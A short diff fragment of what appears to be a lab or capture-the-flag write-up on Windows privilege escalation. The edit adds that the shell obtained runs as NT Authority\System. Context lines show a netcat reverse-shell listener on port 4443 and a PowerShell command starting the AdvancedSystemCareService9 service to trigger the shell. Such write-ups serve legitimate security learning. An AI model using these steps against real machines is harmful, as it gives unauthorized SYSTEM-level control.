@@ -237,9 +237,10 @@ nc -lvnp 4443
 powershell -c "Start-Service -Name 'AdvancedSystemCareService9'"
 ```
 
-and bingo! we have a shell.
+and bingo! we have a shell NT Authority\\System.
 
 ![](images/20230913144245.png)
 
 ![](images/20230913144315.png)
+
 GGs! 🤝
